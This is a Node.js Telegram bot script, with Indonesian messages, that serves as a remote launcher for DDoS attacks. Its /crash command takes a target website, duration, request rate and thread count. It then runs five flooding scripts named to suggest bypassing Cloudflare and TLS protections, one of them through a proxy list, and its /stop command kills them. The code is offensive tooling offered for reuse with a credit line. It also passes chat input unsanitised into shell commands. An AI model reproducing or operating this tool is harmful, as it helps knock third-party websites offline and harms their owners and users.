const fs = require('fs');
const readline = require('readline');
const { exec } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');

const configPath = 'config.json';

let bot;

function startBot(token, adminId) {
  bot = new TelegramBot(token, { polling: true });
  console.log("Bot sudah aktif!");
  
bot.sendMessage(adminId, 'BOT SUDAH ON SIAP UNTUK DDOS');


 bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    const message = `
     
      
      Berikut adalah beberapa perintah yang tersedia:
      /start - Menampilkan pesan ini.
      /stop - Menghentikan semua script yang berjalan 
      /crash [web] [time] [req] [thread] - Menjalankan script ddos

     @dylagimewing
    `;

    const options = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Created By dycoders',
              url: 't.me/teamhsj'
            }
          ]
        ]
      }
    };

    bot.sendMessage(chatId, message, options);
  });


  bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId.toString() === adminId) {
      exec("pkill -f CFbypass.js");
      exec("pkill -f TLS-BYPASS.js");
      exec("pkill -f UAM.js");
      exec("pkill -f MIXMAX.js");
      exec("pkill -f tlsvip.js");
  

      bot.sendMessage(chatId, 'Berhasil menghentikan file yang sedang berjalan.');
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya admin yang dapat menggunakan perintah ini.');
    }
  });

  
  bot.onText(/\/crash (.+) (.+) (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId.toString() === adminId) {
      const web = match[1];
      const time = match[2];
      const req = match[3];
      const thread = match[4];

      
      exec(`node CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

      
      exec(`node TLS-BYPASS.js ${web} ${time} ${req} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

      
      exec(`node MIXMAX.js ${web} ${time} ${req} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

      
      exec(`node tlsvip.js ${web} ${time} ${req} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

     
      exec(`node UAM.js ${web} ${time} ${req} ${thread} proxy3.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

      
      

    } else {
      bot.sendMessage(chatId, 'Maaf, hanya admin yang dapat menggunakan perintah ini.');
    }
  });
}



  

function promptForConfig() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question('Please enter your bot token: ', (token) => {
    if (!token) {
      console.error('Bot token is required!');
      rl.close();
      process.exit(1);
    }

    rl.question('Please enter your admin Telegram ID: ', (adminId) => {
      if (!adminId) {
        console.error('Admin Telegram ID is required!');
        rl.close();
        process.exit(1);
      }

      const config = { BOT_TOKEN: token, ADMIN_ID: adminId };
      fs.writeFile(configPath, JSON.stringify(config), (err) => {
        if (err) {
          console.error('Error writing config file:', err);
          process.exit(1);
        }
        console.log('Token and Admin ID successfully saved to config.json');
        startBot(token, adminId);
        rl.close();
      });
    });
  });
}

fs.access(configPath, fs.constants.F_OK, (err) => {
  if (err) {
    promptForConfig();
  } else {
    fs.readFile(configPath, 'utf8', (err, data) => {
      if (err) {
        console.error('Error reading config file:', err);
        process.exit(1);
      }

      try {
        const config = JSON.parse(data);
        const token = config.BOT_TOKEN;
        const adminId = config.ADMIN_ID;
        if (!token || !adminId) {
          console.error('Bot token and Admin ID are required in config file!');
          process.exit(1);
        }
        startBot(token, adminId);
      } catch (err) {
        console.error('Error parsing config file:', err);
        process.exit(1);
      }
    });
  }
});


//DI RECODE GKPP ASAL KASIH CREADIT @dycoders
